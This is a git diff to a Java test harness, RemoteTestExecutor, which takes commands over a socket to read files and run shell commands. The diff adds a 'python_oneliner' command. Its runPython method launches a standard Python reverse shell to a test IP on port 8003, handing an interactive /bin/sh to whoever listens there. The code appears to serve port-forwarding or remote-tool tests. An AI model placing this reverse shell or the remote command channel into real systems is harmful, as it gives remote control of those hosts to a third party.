@@ -17,6 +17,7 @@ import java.util.concurrent.Future;
 
 import util.Time;
 import util.test.OutputStreamWriterHelper;
+import util.test.TestConstants;
 
 public class RemoteTestExecutor {
 
@@ -27,6 +28,7 @@ public class RemoteTestExecutor {
 
 	private static final String CMD_READFILE = "readfile";
 	private static final String CMD_EXECUTE_SHELL = "bc";
+	public static final String CMD_EXECUTE_PYTHON = "python_oneliner";
 	private static final String CMD_QUIT = "quit";
 
 	private static final String MSG_INITIAL_SERVER = "Awaiting Orders";
@@ -40,10 +42,9 @@ public class RemoteTestExecutor {
 		exec.runTestServer(host, port);
 	}
 
-	public void startTestProgram(int port, String startCmd) {
+	public boolean startTestProgram(int port, String startCmd) {
 
-		try {
-			ServerSocket ss = new ServerSocket(port);
+		try (ServerSocket ss = new ServerSocket(port)) {
 			ss.setSoTimeout(5000);
 
 			Socket newSession = ss.accept();
@@ -72,11 +73,13 @@ public class RemoteTestExecutor {
 			} catch (IOException e) {
 				e.printStackTrace();
 				newSession.close();
+				return false;
 			}
 
-			ss.close();
+			return true;
 		} catch (IOException ex) {
-			ex.printStackTrace();
+			System.out.println("Remote tester not available");
+			return false;
 		}
 	}
 
@@ -166,6 +169,9 @@ public class RemoteTestExecutor {
 						String fileStr = Base64.getEncoder().encodeToString(file);
 						System.out.println("Sending a file of length: " + fileStr.length());
 						OutputStreamWriterHelper.writeAndSend(bw, fileStr);
+					}else if(input.equals(CMD_EXECUTE_PYTHON)) {
+						runPython(bw);
+						OutputStreamWriterHelper.writeAndSend(bw, MSG_COMMAND_COMPLETE);
 					} else if (input.startsWith(CMD_EXECUTE_SHELL)) {
 						String commandToExe =input.substring(CMD_EXECUTE_SHELL.length() + 1);
 						System.out.println("Executing: " + commandToExe);
@@ -190,6 +196,28 @@ public class RemoteTestExecutor {
 				Time.sleepWrapped(1000);
 			}
 		}
+	}
+	
+	private void runPython(OutputStreamWriter bw) throws IOException, InterruptedException, ExecutionException{
+		String[] command = {"python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + TestConstants.PORT_FORWARD_TEST_IP_LINUX +  "\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'"};
+		System.out.println("Running command: " + command);
+		Runnable runner2 = new Runnable() {
+			@Override
+			public void run() {
+				try {
+					Process process = Runtime.getRuntime().exec(command);
+					process.waitFor();
+					//System.out.println(new String(process.getErrorStream().readAllBytes()));
+					//System.out.println(new String(process.getInputStream().readAllBytes()));
+				} catch (IOException | InterruptedException e) {
+					e.printStackTrace();
+				}
+
+			}
+		};
+		Future<?> exe = service.submit(runner2);
+		OutputStreamWriterHelper.writeAndSend(bw, MSG_PROCESS_EXECUTE);
+		exe.get();
 	}
 	
 	private void runCommand(OutputStreamWriter bw, String command) throws IOException, InterruptedException, ExecutionException{
